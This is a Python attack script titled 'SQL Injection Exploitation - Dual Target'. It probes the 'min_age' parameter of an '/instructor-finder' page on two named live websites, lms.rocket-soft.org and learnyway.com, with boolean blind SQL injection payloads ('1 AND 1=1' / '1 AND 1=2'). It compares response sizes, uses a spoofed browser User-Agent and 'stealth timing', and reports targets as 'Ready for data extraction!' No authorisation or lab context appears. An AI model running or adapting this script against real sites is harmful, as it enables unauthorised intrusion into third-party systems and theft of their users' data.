"""
SQL INJECTION EXPLOITATION - DUAL TARGET
=========================================

Testing SQLi on both targets:
1. lms.rocket-soft.org - TRUE=251KB, FALSE=110KB
2. learnyway.com - TRUE=138KB, FALSE=71KB (may be patched)

Using proper User-Agent and stealth timing
"""

import requests
import time

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
}

TARGETS = [
    "https://lms.rocket-soft.org",
    "https://learnyway.com",
]

def test_sqli(base_url):
    """Test SQLi vulnerability"""
    print(f"\n{'='*60}")
    print(f"    TESTING: {base_url}")
    print("="*60)
    
    url = f"{base_url}/instructor-finder"
    
    try:
        # Baseline
        r_base = requests.get(url, params={"min_age": "1"}, headers=HEADERS, timeout=15)
        base_len = len(r_base.text)
        print(f"[*] Baseline (min_age=1): {base_len} bytes, Status: {r_base.status_code}")
        
        time.sleep(1)
        
        # TRUE condition
        r_true = requests.get(url, params={"min_age": "1 AND 1=1"}, headers=HEADERS, timeout=15)
        true_len = len(r_true.text)
        print(f"[*] TRUE (1 AND 1=1): {true_len} bytes, Status: {r_true.status_code}")
        
        time.sleep(1)
        
        # FALSE condition  
        r_false = requests.get(url, params={"min_age": "1 AND 1=2"}, headers=HEADERS, timeout=15)
        false_len = len(r_false.text)
        print(f"[*] FALSE (1 AND 1=2): {false_len} bytes, Status: {r_false.status_code}")
        
        diff = true_len - false_len
        print(f"\n[*] Difference: {diff} bytes")
        
        if diff > 10000:
            print(f"[!!!] SQLi CONFIRMED! Large difference detected.")
            return base_url, true_len, false_len
        elif diff > 1000:
            print(f"[+] Possible SQLi, moderate difference")
            return base_url, true_len, false_len
        else:
            print(f"[-] No SQLi detected (same response size)")
            return None, None, None
            
    except Exception as e:
        print(f"[!] Error: {e}")
        return None, None, None

def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║       SQL INJECTION VERIFICATION - DUAL TARGET               ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    for target in TARGETS:
        url, true_len, false_len = test_sqli(target)
        
        if url:
            print(f"\n[+] Vulnerable target found: {url}")
            print(f"    Ready for data extraction!")

if __name__ == "__main__":
    main()
